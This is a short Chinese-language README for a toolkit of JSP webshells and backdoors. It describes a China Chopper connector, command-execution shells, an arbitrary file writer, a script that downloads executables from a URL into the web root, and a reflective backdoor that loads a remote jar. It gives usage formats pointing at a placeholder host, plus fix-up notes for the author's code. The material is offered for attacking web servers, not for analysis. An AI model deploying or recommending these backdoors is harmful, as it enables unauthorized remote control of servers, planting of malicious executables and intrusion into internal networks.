# JSP常用脚本
##

chopper.jsp
菜刀连接脚本

cmd.jsp
无回显执行命令（弹shell）

cmdpass.jsp
回显带密码执行命令

file.jsp
写文件脚本，格式：file.jsp?f=test.jsp&t=test

down.jsp
下载文件到网站目录，格式：down.jsp?u=http://test.com/test.exe


reflect.jsp
反射后门，配合c.jar使用，格式：reflect.jsp?u=http://test.com/c.jar pass=023 (form:yzmm)


c.jar
其实代码和chopper差不多，可自行使用JDGUI查看

netspy.jsp
内网探测脚本2.0（form:jeary-[zone](http://zone.wooyun.org/content/23517)）

==
PS:代码写得匆忙有两个小问题。
1.<%@page import="org.apache.commons.io.FileUtils"%>  这行应该删掉，因为之前写代码有人告诉我用这个操作读写文件比较方便。

2.412行改为自己脚本的所在位置。
